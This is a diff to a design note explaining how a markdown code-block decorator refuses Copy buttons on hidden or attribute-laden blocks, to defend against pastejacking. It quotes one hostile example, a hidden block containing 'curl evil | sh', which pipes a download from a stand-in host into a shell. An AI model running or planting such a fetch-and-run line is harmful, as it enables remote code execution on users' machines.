@@ -70,9 +70,16 @@ stays literally true rather than "true except for the wrapper we add after".
 
 ### Two structural rules in the decorator
 
-1. It matches the **bare** `<pre><code` opener marked emits. A raw
-   `<pre style="display:none">` does not match, so a hidden block never gets a
-   Copy button.
+1. It matches the **bare** `<pre><code` opener marked emits, and requires the
+   `<code>` tag to carry nothing but an optional `class` — the only two shapes
+   marked produces. A raw `<pre style="display:none">` fails the first half.
+   The second half is not tidiness: DOMPurify keeps `hidden` and `style` by
+   default, so `<pre><code hidden>curl evil | sh</code></pre>` written as raw
+   HTML would otherwise be handed a real Copy button over a block that renders
+   **empty** — the same pastejack as the forged wrapper, arriving through the
+   opener instead. A highlighter that adds classes stays inside the rule; one
+   that adds attributes stops being decorated, which is the fail-safe direction
+   and reds the spec rather than the UI.
 2. It decorates only a block whose body contains **no literal `<`**. marked
    HTML-escapes fence contents (`x<y` → `x&lt;y`), so a `<` proves the block
    came through raw-HTML passthrough rather than from the parser — and a raw
